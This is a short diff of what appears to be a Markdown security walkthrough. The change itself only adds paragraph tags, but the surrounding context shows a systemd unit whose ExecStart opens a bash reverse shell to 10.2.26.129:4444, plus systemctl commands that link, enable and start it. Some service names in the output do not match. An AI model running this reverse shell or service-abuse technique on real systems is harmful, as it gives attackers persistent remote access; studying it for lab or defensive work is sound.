@@ -51,6 +51,7 @@ ExecStart=/bin/bash -c "bash -i >& /dev/tcp/10.2.26.129/4444 0>&1"
 WantedBy=multi-user.target
 
 ```
+<p>
 systemctl link /tmp/revshell.service
 Created symlink from /etc/systemd/system/revshell.service to /tmp/revshell.service.
 $ systemctl enable --now /tmp/daya.service
@@ -58,6 +59,7 @@ Created symlink from /etc/systemd/system/multi-user.target.wants/revshell.servic
 Job for daya.service failed because the control process exited with error code. See "systemctl status revshell.service" and "journalctl -xe" for details.
 
 systemctl start revshell.service
+<p>
 
 
 ### Jekyll Themes
